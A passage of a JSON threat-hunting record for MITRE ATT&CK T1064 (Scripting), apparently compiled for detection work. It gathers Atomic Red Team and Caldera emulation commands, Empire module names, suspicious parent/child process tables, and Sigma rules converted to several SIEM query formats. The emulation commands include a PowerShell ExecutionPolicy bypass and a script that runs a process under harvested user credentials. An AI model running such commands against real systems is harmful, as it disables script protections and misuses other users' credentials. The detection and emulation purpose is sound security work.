"Threat Hunting Tables", "command": "sh.exe", "name": "sub_process_1"}, {"source": "Threat Hunting Tables", "command": "winword.exe", "name": "parent_process"}, {"source": "Threat Hunting Tables", "command": "bash.exe", "name": "sub_process_1"}, {"source": "Threat Hunting Tables", "command": "winword.exe", "name": "parent_process"}, {"source": "Threat Hunting Tables", "command": "csc.exe", "name": "sub_process_1"}, {"source": "Threat Hunting Tables", "command": "cvtres.exe", "name": "sub_process_2"}, {"source": "Threat Hunting Tables", "command": "wscript.exe", "name": "parent_process"}, {"source": "Threat Hunting Tables", "command": "wscript.exe", "name": "parent_process"}, {"source": "Threat Hunting Tables", "command": "*.jse", "name": "sub_process_1"}, {"source": "Threat Hunting Tables", "command": "wscript.exe", "name": "parent_process"}, {"source": "Threat Hunting Tables", "command": "*.vbe", "name": "sub_process_1"}, {"source": "Threat Hunting Tables", "command": "wscript.exe", "name": "parent_process"}, {"source": "Threat Hunting Tables", "command": "*.js", "name": "sub_process_1"}, {"source": "Threat Hunting Tables", "command": "wscript.exe", "name": "parent_process"}, {"source": "Threat Hunting Tables", "command": "*.vba", "name": "sub_process_1"}, {"source": "Threat Hunting Tables", "command": "wscript.exe", "name": "parent_process"}, {"source": "Threat Hunting Tables", "command": "*.vbs", "name": "sub_process_1"}, {"source": "Threat Hunting Tables", "command": "winword.exe", "name": "parent_process"}, {"source": "Threat Hunting Tables", "command": "javaw.exe", "name": "sub_process_1"}, {"source": "Threat Hunting Tables", "command": "java.exe", "name": "sub_process_2"}, {"source": "SysmonHunter - Scripting", "command": "wscript.exe|cscript.exe", "name": null}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/code_execution/invoke_metasploitpayload", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/code_execution/invoke_metasploitpayload", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/management/invoke_script", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/management/invoke_script", "name": "Empire Module Command"}, {"source": "Kirtar22/Litmus_Test", "command": "Creates and executes a simple bash script.", "name": null}], "command_list": ["sh -c \"echo 'echo Hello from the Atomic Red Team' > /tmp/art.sh\"\nsh -c \"echo 'ping -c 4 8.8.8.8' >> /tmp/art.sh\"\nchmod +x /tmp/art.sh\nsh /tmp/art.sh\n", "C:\\Windows\\system32\\cmd.exe /Q /c echo #{command_to_execute} > C:\\Windows\\TEMP\\execute.bat\nC:\\Windows\\system32\\cmd.exe /Q /c C:\\Windows\\TEMP\\execute.bat \n", "C:\\Windows\\system32\\cmd.exe /Q /c echo dir > C:\\Windows\\TEMP\\execute.bat\nC:\\Windows\\system32\\cmd.exe /Q /c C:\\Windows\\TEMP\\execute.bat \n", {"windows": {"psh": {"command": "Set-ItemProperty -Path HKLM:\\Software\\Policies\\Microsoft\\Windows\\PowerShell -Name ExecutionPolicy -Value ByPass;\n        $shell = New-Object -ComObject Wscript.Shell\n        Set-ExecutionPolicy Bypass | echo $shell.sendkeys(\"Y`r`n\")"}}}, {"windows": {"psh": {"command": "$job = Start-Job -ScriptBlock {\n  $username = '#{host.user.name}';\n  $password = '#{host.user.password}';\n  $securePassword = ConvertTo-SecureString $password -AsPlainText -Force;\n  $credential = New-Object System.Management.Automation.PSCredential $username, $securePassword;\n  Start-Process Notepad.exe -NoNewWindow -PassThru -Credential $credential;\n};\nReceive-Job -Job $job -Wait;\n"}}}, "cscript.exe", "*.jse", "cscript.exe", "*.vbe", "cscript.exe", "*.js", "cscript.exe", "*.vba", "cscript.exe", "*.vbs", "excel.exe", "cmd.exe", "excel.exe", "cscript.exe", "excel.exe", "wscript.exe", "excel.exe", "sh.exe", "excel.exe", "bash.exe", "mshta.exe", "cscript.exe", "mshta.exe", "wscript.exe", "powerpoint.exe", "cmd.exe", "powerpoint.exe", "cscript.exe", "powerpoint.exe", "wscript.exe", "powerpoint.exe", "sh.exe", "powerpoint.exe", "bash.exe", "winword.exe", "cmd.exe", "powershell.exe", "winword.exe", "cmd.exe", "winword.exe", "cscript.exe", "winword.exe", "wscript.exe", "winword.exe", "sh.exe", "winword.exe", "bash.exe", "winword.exe", "csc.exe", "cvtres.exe", "wscript.exe", "wscript.exe", "*.jse", "wscript.exe", "*.vbe", "wscript.exe", "*.js", "wscript.exe", "*.vba", "wscript.exe", "*.vbs", "winword.exe", "javaw.exe", "java.exe", "wscript.exe|cscript.exe", "powershell/code_execution/invoke_metasploitpayload", "powershell/code_execution/invoke_metasploitpayload", "powershell/management/invoke_script", "powershell/management/invoke_script", "Creates and executes a simple bash script."], "technique_id": "T1064", "parsed_datasets": [{"Atomic Red Team Test - Scripting": {"display_name": "Scripting", "atomic_tests": [{"description": "Creates and executes a simple bash script.\n", "supported_platforms": ["macos", "linux"], "name": "Create and Execute Bash Shell Script", "executor": {"elevation_required": false, "command": "sh -c \"echo 'echo Hello from the Atomic Red Team' > /tmp/art.sh\"\nsh -c \"echo 'ping -c 4 8.8.8.8' >> /tmp/art.sh\"\nchmod +x /tmp/art.sh\nsh /tmp/art.sh\n", "name": "sh"}}, {"description": "Creates and executes a simple batch script.\n", "supported_platforms": ["windows"], "name": "Create and Execute Batch Script", "input_arguments": {"script_to_create": {"default": "C:\\Windows\\TEMP\\execute.bat", "type": "path", "description": "Path of script to create."}, "command_to_execute": {"default": "dir", "type": "string", "description": "Command to execute within script."}}, "executor": {"elevation_required": false, "command": "C:\\Windows\\system32\\cmd.exe /Q /c echo #{command_to_execute} > #{script_to_create}\nC:\\Windows\\system32\\cmd.exe /Q /c #{script_to_create} \n", "name": "command_prompt", "cleanup_command": "del #{script_to_create} >nul 2>&1\n"}}], "attack_technique": "T1064"}}, {"Mitre Stockpile - Ensure the ExecutionPolicy is turned to Bypass": {"platforms": {"windows": {"psh": {"command": "Set-ItemProperty -Path HKLM:\\Software\\Policies\\Microsoft\\Windows\\PowerShell -Name ExecutionPolicy -Value ByPass;\n        $shell = New-Object -ComObject Wscript.Shell\n        Set-ExecutionPolicy Bypass | echo $shell.sendkeys(\"Y`r`n\")"}}}, "description": "Ensure the ExecutionPolicy is turned to Bypass", "tactic": "defense-evasion", "technique": {"attack_id": "T1064", "name": "Scripting"}, "id": "3864fd22-5c63-41c9-bdbc-a66b5ffa3f5e", "name": "Bypass ExecutionPolicy"}}, {"Mitre Stockpile - Run an application as a different user": {"platforms": {"windows": {"psh": {"command": "$job = Start-Job -ScriptBlock {\n  $username = '#{host.user.name}';\n  $password = '#{host.user.password}';\n  $securePassword = ConvertTo-SecureString $password -AsPlainText -Force;\n  $credential = New-Object System.Management.Automation.PSCredential $username, $securePassword;\n  Start-Process Notepad.exe -NoNewWindow -PassThru -Credential $credential;\n};\nReceive-Job -Job $job -Wait;\n"}}}, "requirements": [{"plugins.stockpile.app.requirements.paw_provenance": [{"source": "host.user.name"}]}, {"plugins.stockpile.app.requirements.basic": [{"source": "host.user.name", "edge": "has_password", "target": "host.user.password"}]}], "description": "Run an application as a different user", "tactic": "execution", "technique": {"attack_id": "T1064", "name": "Scripting"}, "id": "3796a00b-b11d-4731-b4ca-275a07d83299", "name": "Impersonate user"}}, {"Threat Hunting Tables": {"mitre_attack": "T1064", "file_value": "", "file_path": "", "parent_process": "cscript.exe", "itw_sample": "ed01ebfbc9eb5bbea545af4d01bf5f1071661840480439c6e5babe8e080e41aa", "chain_id": "100016", "registry_value": "", "mitre_caption": "scripting", "registry_path": "", "frequency": "rare", "commandline_string": "", "loaded_dll": "", "os": "windows", "sub_process_1": "*.jse", "sub_process_2": ""}}, {"Threat Hunting Tables": {"mitre_attack": "T1064", "file_value": "", "file_path": "", "parent_process": "cscript.exe", "itw_sample": "ed01ebfbc9eb5bbea545af4d01bf5f1071661840480439c6e5babe8e080e41aa", "chain_id": "100017", "registry_value": "", "mitre_caption": "scripting", "registry_path": "", "frequency": "rare", "commandline_string": "", "loaded_dll": "", "os": "windows", "sub_process_1": "*.vbe", "sub_process_2": ""}}, {"Threat Hunting Tables": {"mitre_attack": "T1064", "file_value": "", "file_path": "", "parent_process": "cscript.exe", "itw_sample": "4bcc2af66d843614f1a8ef0daeb1987c08ff6a5c4a9930f9307f65b07f0888bd", "chain_id": "100018", "registry_value": "", "mitre_caption": "scripting", "registry_path": "", "frequency": "rare", "commandline_string": "", "loaded_dll": "", "os": "windows", "sub_process_1": "*.js", "sub_process_2": ""}}, {"Threat Hunting Tables": {"mitre_attack": "T1064", "file_value": "", "file_path": "", "parent_process": "cscript.exe", "itw_sample": "ed01ebfbc9eb5bbea545af4d01bf5f1071661840480439c6e5babe8e080e41aa", "chain_id": "100019", "registry_value": "", "mitre_caption": "scripting", "registry_path": "", "frequency": "rare", "commandline_string": "", "loaded_dll": "", "os": "windows", "sub_process_1": "*.vba", "sub_process_2": ""}}, {"Threat Hunting Tables": {"mitre_attack": "T1064", "file_value": "", "file_path": "", "parent_process": "cscript.exe", "itw_sample": "9feb89d55680071ce79f32529591bd3d51536f9e08672cb79d0ab81b57cf905d", "chain_id": "100020", "registry_value": "", "mitre_caption": "scripting", "registry_path": "", "frequency": "high", "commandline_string": "", "loaded_dll": "", "os": "windows", "sub_process_1": "*.vbs", "sub_process_2": ""}}, {"Threat Hunting Tables": {"mitre_attack": "T1064", "file_value": "", "file_path": "", "parent_process": "excel.exe", "itw_sample": "", "chain_id": "100026", "registry_value": "", "mitre_caption": "scripting", "registry_path": "", "frequency": "low", "commandline_string": "", "loaded_dll": "", "os": "windows", "sub_process_1": "cmd.exe", "sub_process_2": ""}}, {"Threat Hunting Tables": {"mitre_attack": "T1064", "file_value": "", "file_path": "", "parent_process": "excel.exe", "itw_sample": "", "chain_id": "100027", "registry_value": "", "mitre_caption": "scripting", "registry_path": "", "frequency": "rare", "commandline_string": "", "loaded_dll": "", "os": "windows", "sub_process_1": "cscript.exe", "sub_process_2": ""}}, {"Threat Hunting Tables": {"mitre_attack": "T1064", "file_value": "", "file_path": "", "parent_process": "excel.exe", "itw_sample": "", "chain_id": "100028", "registry_value": "", "mitre_caption": "powershell", "registry_path": "", "frequency": "rare", "commandline_string": "", "loaded_dll": "", "os": "windows", "sub_process_1": "wscript.exe", "sub_process_2": ""}}, {"Threat Hunting Tables": {"mitre_attack": "T1064", "file_value": "", "file_path": "", "parent_process": "excel.exe", "itw_sample": "", "chain_id": "100030", "registry_value": "", "mitre_caption": "scripting", "registry_path": "", "frequency": "rare", "commandline_string": "", "loaded_dll": "", "os": "windows", "sub_process_1": "sh.exe", "sub_process_2": ""}}, {"Threat Hunting Tables": {"mitre_attack": "T1064", "file_value": "", "file_path": "", "parent_process": "excel.exe", "itw_sample": "", "chain_id": "100031", "registry_value": "", "mitre_caption": "scripting", "registry_path": "", "frequency": "rare", "commandline_string": "", "loaded_dll": "", "os": "windows", "sub_process_1": "bash.exe", "sub_process_2": ""}}, {"Threat Hunting Tables": {"mitre_attack": "T1064", "file_value": "", "file_path": "", "parent_process": "mshta.exe", "itw_sample": "6707264f01730f55c79379d75d29000fb44c92de99b8a1d58588e05963f3dea6", "chain_id": "100043", "registry_value": "", "mitre_caption": "scripting", "registry_path": "", "frequency": "low", "commandline_string": "", "loaded_dll": "", "os": "windows", "sub_process_1": "cscript.exe", "sub_process_2": ""}}, {"Threat Hunting Tables": {"mitre_attack": "T1064", "file_value": "", "file_path": "", "parent_process": "mshta.exe", "itw_sample": "aab57e55b04eb09ef97c7bc0c79d5c0ffeda557c7333777cd178adced03676cc", "chain_id": "100044", "registry_value": "", "mitre_caption": "scripting", "registry_path": "", "frequency": "low", "commandline_string": "", "loaded_dll": "", "os": "windows", "sub_process_1": "wscript.exe", "sub_process_2": ""}}, {"Threat Hunting Tables": {"mitre_attack": "T1064", "file_value": "", "file_path": "", "parent_process": "powerpoint.exe", "itw_sample": "", "chain_id": "100057", "registry_value": "", "mitre_caption": "scripting", "registry_path": "", "frequency": "rare", "commandline_string": "", "loaded_dll": "", "os": "windows", "sub_process_1": "cmd.exe", "sub_process_2": ""}}, {"Threat Hunting Tables": {"mitre_attack": "T1064", "file_value": "", "file_path": "", "parent_process": "powerpoint.exe", "itw_sample": "", "chain_id": "100058", "registry_value": "", "mitre_caption": "scripting", "registry_path": "", "frequency": "rare", "commandline_string": "", "loaded_dll": "", "os": "windows", "sub_process_1": "cscript.exe", "sub_process_2": ""}}, {"Threat Hunting Tables": {"mitre_attack": "T1064", "file_value": "", "file_path": "", "parent_process": "powerpoint.exe", "itw_sample": "", "chain_id": "100059", "registry_value": "", "mitre_caption": "scripting", "registry_path": "", "frequency": "rare", "commandline_string": "", "loaded_dll": "", "os": "windows", "sub_process_1": "wscript.exe", "sub_process_2": ""}}, {"Threat Hunting Tables": {"mitre_attack": "T1064", "file_value": "", "file_path": "", "parent_process": "powerpoint.exe", "itw_sample": "", "chain_id": "100061", "registry_value": "", "mitre_caption": "scripting", "registry_path": "", "frequency": "rare", "commandline_string": "", "loaded_dll": "", "os": "windows", "sub_process_1": "sh.exe", "sub_process_2": ""}}, {"Threat Hunting Tables": {"mitre_attack": "T1064", "file_value": "", "file_path": "", "parent_process": "powerpoint.exe", "itw_sample": "", "chain_id": "100062", "registry_value": "", "mitre_caption": "scripting", "registry_path": "", "frequency": "rare", "commandline_string": "", "loaded_dll": "", "os": "windows", "sub_process_1": "bash.exe", "sub_process_2": ""}}, {"Threat Hunting Tables": {"mitre_attack": "T1064", "file_value": "", "file_path": "", "parent_process": "winword.exe", "itw_sample": "1d20934083558bc5a23e57b4f14ec1147f19d23807e8956714b256ae64f9692c", "chain_id": "100088", "registry_value": "", "mitre_caption": "powershell", "registry_path": "", "frequency": "rare", "commandline_string": "", "loaded_dll": "", "os": "windows", "sub_process_1": "cmd.exe", "sub_process_2": "powershell.exe"}}, {"Threat Hunting Tables": {"mitre_attack": "T1064", "file_value": "", "file_path": "", "parent_process": "winword.exe", "itw_sample": "", "chain_id": "100089", "registry_value": "", "mitre_caption": "scripting", "registry_path": "", "frequency": "rare", "commandline_string": "", "loaded_dll": "", "os": "windows", "sub_process_1": "cmd.exe", "sub_process_2": ""}}, {"Threat Hunting Tables": {"mitre_attack": "T1064", "file_value": "", "file_path": "", "parent_process": "winword.exe", "itw_sample": "", "chain_id": "100090", "registry_value": "", "mitre_caption": "scripting", "registry_path": "", "frequency": "rare", "commandline_string": "", "loaded_dll": "", "os": "windows", "sub_process_1": "cscript.exe", "sub_process_2": ""}}, {"Threat Hunting Tables": {"mitre_attack": "T1064", "file_value": "", "file_path": "", "parent_process": "winword.exe", "itw_sample": "", "chain_id": "100091", "registry_value": "", "mitre_caption": "scripting", "registry_path": "", "frequency": "rare", "commandline_string": "", "loaded_dll": "", "os": "windows", "sub_process_1": "wscript.exe", "sub_process_2": ""}}, {"Threat Hunting Tables": {"mitre_attack": "T1064", "file_value": "", "file_path": "", "parent_process": "winword.exe", "itw_sample": "", "chain_id": "100093", "registry_value": "", "mitre_caption": "scripting", "registry_path": "", "frequency": "rare", "commandline_string": "", "loaded_dll": "", "os": "windows", "sub_process_1": "sh.exe", "sub_process_2": ""}}, {"Threat Hunting Tables": {"mitre_attack": "T1064", "file_value": "", "file_path": "", "parent_process": "winword.exe", "itw_sample": "", "chain_id": "100094", "registry_value": "", "mitre_caption": "scripting", "registry_path": "", "frequency": "rare", "commandline_string": "", "loaded_dll": "", "os": "windows", "sub_process_1": "bash.exe", "sub_process_2": ""}}, {"Threat Hunting Tables": {"mitre_attack": "T1064", "file_value": "", "file_path": "", "parent_process": "winword.exe", "itw_sample": "947ce5214919e4395a2454375972d37756e1162890c62b0bb30e2a4be9ddaf54", "chain_id": "100097", "registry_value": "", "mitre_caption": "scripting", "registry_path": "", "frequency": "low", "commandline_string": "", "loaded_dll": "", "os": "windows", "sub_process_1": "csc.exe", "sub_process_2": "cvtres.exe"}}, {"Threat Hunting Tables": {"mitre_attack": "T1064", "file_value": "", "file_path": "", "parent_process": "wscript.exe", "itw_sample": "", "chain_id": "100103", "registry_value": "", "mitre_caption": "scripting", "registry_path": "", "frequency": "low", "commandline_string": "", "loaded_dll": "", "os": "windows", "sub_process_1": "", "sub_process_2": ""}}, {"Threat Hunting Tables": {"mitre_attack": "T1064", "file_value": "", "file_path": "", "parent_process": "wscript.exe", "itw_sample": "", "chain_id": "100104", "registry_value": "", "mitre_caption": "scripting", "registry_path": "", "frequency": "low", "commandline_string": "", "loaded_dll": "", "os": "windows", "sub_process_1": "*.jse", "sub_process_2": ""}}, {"Threat Hunting Tables": {"mitre_attack": "T1064", "file_value": "", "file_path": "", "parent_process": "wscript.exe", "itw_sample": "", "chain_id": "100105", "registry_value": "", "mitre_caption": "scripting", "registry_path": "", "frequency": "low", "commandline_string": "", "loaded_dll": "", "os": "windows", "sub_process_1": "*.vbe", "sub_process_2": ""}}, {"Threat Hunting Tables": {"mitre_attack": "T1064", "file_value": "", "file_path": "", "parent_process": "wscript.exe", "itw_sample": "", "chain_id": "100106", "registry_value": "", "mitre_caption": "scripting", "registry_path": "", "frequency": "low", "commandline_string": "", "loaded_dll": "", "os": "windows", "sub_process_1": "*.js", "sub_process_2": ""}}, {"Threat Hunting Tables": {"mitre_attack": "T1064", "file_value": "", "file_path": "", "parent_process": "wscript.exe", "itw_sample": "", "chain_id": "100107", "registry_value": "", "mitre_caption": "scripting", "registry_path": "", "frequency": "low", "commandline_string": "", "loaded_dll": "", "os": "windows", "sub_process_1": "*.vba", "sub_process_2": ""}}, {"Threat Hunting Tables": {"mitre_attack": "T1064", "file_value": "", "file_path": "", "parent_process": "wscript.exe", "itw_sample": "", "chain_id": "100108", "registry_value": "", "mitre_caption": "scripting", "registry_path": "", "frequency": "low", "commandline_string": "", "loaded_dll": "", "os": "windows", "sub_process_1": "*.vbs", "sub_process_2": ""}}, {"Threat Hunting Tables": {"mitre_attack": "T1064", "file_value": "", "file_path": "", "parent_process": "winword.exe", "itw_sample": "https://www.joesandbox.com/analysis/35201/0/html", "chain_id": "100126", "registry_value": "", "mitre_caption": "scripting", "registry_path": "", "frequency": "low", "commandline_string": "", "loaded_dll": "", "os": "windows", "sub_process_1": "javaw.exe", "sub_process_2": "java.exe"}}, {"SysmonHunter - T1064": {"phase": "Execution", "query": [{"process": {"any": {"pattern": "wscript.exe|cscript.exe"}}, "type": "process"}], "description": null, "name": "Scripting", "level": "high"}}, {"Empire Module XLSX Sheet by dstepanic": {"ATT&CK Technique #1": "T1064", "Empire Module": "powershell/code_execution/invoke_metasploitpayload", "Technique": "Scripting", "ATT&CK Technique #2": "", "Concatenate for Python Dictionary": "\"powershell/code_execution/invoke_metasploitpayload\":  [\"T1064\"],"}}, {"Empire Module XLSX Sheet by dstepanic": {"ATT&CK Technique #1": "T1064", "Empire Module": "powershell/management/invoke_script", "Technique": "Scripting", "ATT&CK Technique #2": "", "Concatenate for Python Dictionary": "\"powershell/management/invoke_script\":  [\"T1064\"],"}}], "queries": [{"query": "title: CACTUSTORCH Remote Thread Creation\nid: 2e4e488a-6164-4811-9ea1-f960c7359c40\ndescription: Detects remote thread creation from CACTUSTORCH as described in references.\nreferences:\n    - https://twitter.com/SBousseaden/status/1090588499517079552\n    - https://github.com/mdsecactivebreach/CACTUSTORCH\nstatus: experimental\nauthor: '@SBousseaden (detection), Thomas Patzke (rule)'\nlogsource:\n    product: windows\n    service: sysmon\ndetection:\n    selection:\n        EventID: 8\n        SourceImage:\n            - '*\\System32\\cscript.exe'\n            - '*\\System32\\wscript.exe'\n            - '*\\System32\\mshta.exe'\n            - '*\\winword.exe'\n            - '*\\excel.exe'\n        TargetImage: '*\\SysWOW64\\\\*'\n        StartModule: null\n    condition: selection\ntags:\n    - attack.execution\n    - attack.t1055\n    - attack.t1064\nfalsepositives:\n    - unknown\nlevel: high", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "title: CACTUSTORCH Remote Thread Creation\nid: 2e4e488a-6164-4811-9ea1-f960c7359c40\ndescription: Detects remote thread creation from CACTUSTORCH as described in references.\nreferences:\n    - https://twitter.com/SBousseaden/status/1090588499517079552\n    - https://github.com/mdsecactivebreach/CACTUSTORCH\nstatus: experimental\nauthor: '@SBousseaden (detection), Thomas Patzke (rule)'\nlogsource:\n    product: windows\n    service: sysmon\ndetection:\n    selection:\n        EventID: 8\n        SourceImage:\n            - '*\\System32\\cscript.exe'\n            - '*\\System32\\wscript.exe'\n            - '*\\System32\\mshta.exe'\n            - '*\\winword.exe'\n            - '*\\excel.exe'\n        TargetImage: '*\\SysWOW64\\\\*'\n        StartModule: null\n    condition: selection\ntags:\n    - attack.execution\n    - attack.t1055\n    - attack.t1064\nfalsepositives:\n    - unknown\nlevel: high", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "(EventID:\"8\" AND SourceImage.keyword:(*\\\\\\\\System32\\\\\\\\cscript.exe OR *\\\\\\\\System32\\\\\\\\wscript.exe OR *\\\\\\\\System32\\\\\\\\mshta.exe OR *\\\\\\\\winword.exe OR *\\\\\\\\excel.exe) AND TargetImage.keyword:*\\\\\\\\SysWOW64\\\\\\\\* AND NOT _exists_:StartModule)", "product": "Atomic Threat Coverage", "name": "es-qs"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/CACTUSTORCH-Remote-Thread-Creation <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"CACTUSTORCH Remote Thread Creation\",\\n    \"description\": \"Detects remote thread creation from CACTUSTORCH as described in references.\",\\n    \"tags\": [\\n      \"attack.execution\",\\n      \"attack.t1055\",\\n      \"attack.t1064\"\\n    ],\\n    \"query\": \"(EventID:\\\\\"8\\\\\" AND SourceImage.keyword:(*\\\\\\\\\\\\\\\\System32\\\\\\\\\\\\\\\\cscript.exe OR *\\\\\\\\\\\\\\\\System32\\\\\\\\\\\\\\\\wscript.exe OR *\\\\\\\\\\\\\\\\System32\\\\\\\\\\\\\\\\mshta.exe OR *\\\\\\\\\\\\\\\\winword.exe OR *\\\\\\\\\\\\\\\\excel.exe) AND TargetImage.keyword:*\\\\\\\\\\\\\\\\SysWOW64\\\\\\\\\\\\\\\\* AND NOT _exists_:StartModule)\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"(EventID:\\\\\"8\\\\\" AND SourceImage.keyword:(*\\\\\\\\\\\\\\\\System32\\\\\\\\\\\\\\\\cscript.exe OR *\\\\\\\\\\\\\\\\System32\\\\\\\\\\\\\\\\wscript.exe OR *\\\\\\\\\\\\\\\\System32\\\\\\\\\\\\\\\\mshta.exe OR *\\\\\\\\\\\\\\\\winword.exe OR *\\\\\\\\\\\\\\\\excel.exe) AND TargetImage.keyword:*\\\\\\\\\\\\\\\\SysWOW64\\\\\\\\\\\\\\\\* AND NOT _exists_:StartModule)\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'CACTUSTORCH Remote Thread Creation\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}{{_source}}\\\\n================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "(EventID:\"8\" AND SourceImage.keyword:(*\\\\\\\\System32\\\\\\\\cscript.exe *\\\\\\\\System32\\\\\\\\wscript.exe *\\\\\\\\System32\\\\\\\\mshta.exe *\\\\\\\\winword.exe *\\\\\\\\excel.exe) AND TargetImage.keyword:*\\\\\\\\SysWOW64\\\\\\\\* AND NOT _exists_:StartModule)", "product": "Atomic Threat Coverage", "name": "graylog"}, {"query": "(EventID=\"8\" (SourceImage=\"*\\\\\\\\System32\\\\\\\\cscript.exe\" OR SourceImage=\"*\\\\\\\\System32\\\\\\\\wscript.exe\" OR SourceImage=\"*\\\\\\\\System32\\\\\\\\mshta.exe\" OR SourceImage=\"*\\\\\\\\winword.exe\" OR SourceImage=\"*\\\\\\\\excel.exe\") TargetImage=\"*\\\\\\\\SysWOW64\\\\\\\\*\" NOT StartModule=\"*\")", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "(event_id=\"8\" SourceImage IN [\"*\\\\\\\\System32\\\\\\\\cscript.exe\", \"*\\\\\\\\System32\\\\\\\\wscript.exe\", \"*\\\\\\\\System32\\\\\\\\mshta.exe\", \"*\\\\\\\\winword.exe\", \"*\\\\\\\\excel.exe\"] TargetImage=\"*\\\\\\\\SysWOW64\\\\\\\\*\" -StartModule=*)", "product": "Atomic Threat Coverage", "name": "logpoint"}, {"query": "grep -P '^(?:.*(?=.*8)(?=.*(?:.*.*\\\\System32\\\\cscript\\\\.exe|.*.*\\\\System32\\\\wscript\\\\.exe|.*.*\\\\System32\\\\mshta\\\\.exe|.*.*\\\\winword\\\\.exe|.*.*\\\\excel\\\\.exe))(?=.*.*\\\\SysWOW64\\\\\\\\.*)(?=.*(?!StartModule)))'", "product": "Atomic Threat Coverage", "name": "grep"}, {"query": "title: Suspicious File Characteristics due to Missing Fields\nid: 9637e8a5-7131-4f7f-bdc7-2b05d8670c43\ndescription: Detects Executables without FileVersion,Description,Product,Company likely created with py2exe\nstatus: experimental\nreferences:\n    - https://securelist.com/muddywater/88059/\n    - https://www.virustotal.com/#/file/276a765a10f98cda1a38d3a31e7483585ca3722ecad19d784441293acf1b7beb/detection\nauthor: Markus Neis\ndate: 2018/11/22\nmodified: 2019/11/09\ntags:\n    - attack.defense_evasion\n    - attack.execution\n    - attack.t1064\nlogsource:\n    product: windows\n    service: sysmon\ndetection:\n    selection1:\n        Description: '\\?'\n        FileVersion: '\\?'\n    selection2:\n        Description: '\\?'\n        Product: '\\?'\n    selection3:\n        Description: '\\?'\n        Company: '\\?' \n    condition: 1 of them\nfields:\n    - CommandLine\n    - ParentCommandLine\nfalsepositives:\n    - Unknown\nlevel: medium", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "title: Suspicious File Characteristics due to Missing Fields\nid: 9637e8a5-7131-4f7f-bdc7-2b05d8670c43\ndescription: Detects Executables without FileVersion,Description,Product,Company likely created with py2exe\nstatus: experimental\nreferences:\n    - https://securelist.com/muddywater/88059/\n    - https://www.virustotal.com/#/file/276a765a10f98cda1a38d3a31e7483585ca3722ecad19d784441293acf1b7beb/detection\nauthor: Markus Neis\ndate: 2018/11/22\nmodified: 2019/11/09\ntags:\n    - attack.defense_evasion\n    - attack.execution\n    - attack.t1064\nlogsource:\n    product: windows\n    service: sysmon\ndetection:\n    selection1:\n        Description: '\\?'\n        FileVersion: '\\?'\n    selection2:\n        Description: '\\?'\n        Product: '\\?'\n    selection3:\n        Description: '\\?'\n        Company: '\\?' \n    condition: 1 of them\nfields:\n    - CommandLine\n    - ParentCommandLine\nfalsepositives:\n    - Unknown\nlevel: medium", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "(Description:\"\\\\?\" AND (FileVersion:\"\\\\?\" OR Product:\"\\\\?\" OR Company:\"\\\\?\"))", "product": "Atomic Threat Coverage", "name": "es-qs"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/Suspicious-File-Characteristics-due-to-Missing-Fields <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"Suspicious File Characteristics due to Missing Fields\",\\n    \"description\": \"Detects Executables without FileVersion,Description,Product,Company likely created with py2exe\",\\n    \"tags\": [\\n      \"attack.defense_evasion\",\\n      \"attack.execution\",\\n      \"attack.t1064\"\\n    ],\\n    \"query\": \"(Description:\\\\\"\\\\\\\\?\\\\\" AND (FileVersion:\\\\\"\\\\\\\\?\\\\\" OR Product:\\\\\"\\\\\\\\?\\\\\" OR Company:\\\\\"\\\\\\\\?\\\\\"))\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"(Description:\\\\\"\\\\\\\\?\\\\\" AND (FileVersion:\\\\\"\\\\\\\\?\\\\\" OR Product:\\\\\"\\\\\\\\?\\\\\" OR Company:\\\\\"\\\\\\\\?\\\\\"))\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      